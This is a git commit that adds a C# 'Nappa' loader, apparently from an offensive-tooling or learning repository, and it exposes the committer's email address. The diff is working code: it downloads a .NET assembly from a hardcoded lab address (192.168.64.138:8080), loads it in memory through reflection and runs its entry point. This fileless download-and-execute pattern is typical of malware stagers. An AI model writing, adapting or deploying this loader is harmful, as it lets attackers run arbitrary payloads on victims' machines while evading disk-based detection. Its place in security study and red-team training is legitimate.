4726ccc626ccdb65d97ea3304c1ecbc7f3c81b16
TwistedKnee <daviddrost09@gmail.com>
2022-10-16 16:20:29 -0700

    created nappa loader
    created nappa loader which loads assemblies over the web

--- CSharp Loader/Nappa/Nappa/Program.cs
+++ CSharp Loader/Nappa/Nappa/Program.cs
@@ -3,13 +3,24 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Net;
+using System.Reflection;
 
 namespace Nappa
 {
     class Program
     {
+        static void ReflectFromWeb(string url)
+        {
+            WebClient client = new WebClient();
+            byte[] programBytes = client.DownloadData(url);
+            Assembly dotnetProgram = Assembly.Load(programBytes);
+            object[] parameters = new string[] { null };
+            dotnetProgram.EntryPoint.Invoke(null, parameters);
+        }
         static void Main(string[] args)
         {
+            ReflectFromWeb(@"http://192.168.64.138:8080/HelloReflectionWorld.exe");
         }
     }
 }
